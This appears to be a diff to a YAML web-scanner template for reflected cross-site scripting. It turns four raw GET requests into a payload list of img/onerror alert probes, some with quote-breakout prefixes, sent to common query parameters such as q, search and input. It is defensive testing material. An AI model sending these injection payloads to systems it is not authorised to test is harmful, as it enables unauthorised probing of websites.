@@ -11,38 +11,21 @@ variables:
   random: "{{1}}"
 
 http:
-  - raw:
-      - |
-        GET {{BaseURL}}?param=%3Cimg+src%3D%22x%22+onerror%3D%22alert({{random}})%22%3E HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Accept-Language: en-US,en;q=0.5
-        Connection: close
+  - method: GET
+    path:
+      - "{{BaseURL}}?q={{xss}}"
+      - "{{BaseURL}}?search={{xss}}"
+      - "{{BaseURL}}?param={{xss}}"
+      - "{{BaseURL}}?query={{xss}}"
+      - "{{BaseURL}}?keyword={{xss}}"
+      - "{{BaseURL}}?input={{xss}}"
 
-      - |
-        GET {{BaseURL}}?param=%3Cimg+src%3Dx+onerror%3Dalert({{random}})%3E HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Accept-Language: en-US,en;q=0.5
-        Connection: close
-
-      - |
-        GET {{BaseURL}}?param=%22%3E%3Cimg+src%3D%22x%22+onerror%3D%22alert({{random}})%22%3E HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Accept-Language: en-US,en;q=0.5
-        Connection: close
-
-      - |
-        GET {{BaseURL}}?param=%27%3E%3Cimg+src%3D%22x%22+onerror%3D%22alert({{random}})%22%3E HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-        Accept-Language: en-US,en;q=0.5
-        Connection: close
+    payloads:
+      xss:
+        - '<img src="x" onerror="alert({{random}})">'
+        - '<img src=x onerror=alert({{random}})>'
+        - '"><img src="x" onerror="alert({{random}})">'
+        - "'><img src=\"x\" onerror=\"alert({{random}})\">"
 
     stop-at-first-match: true
 
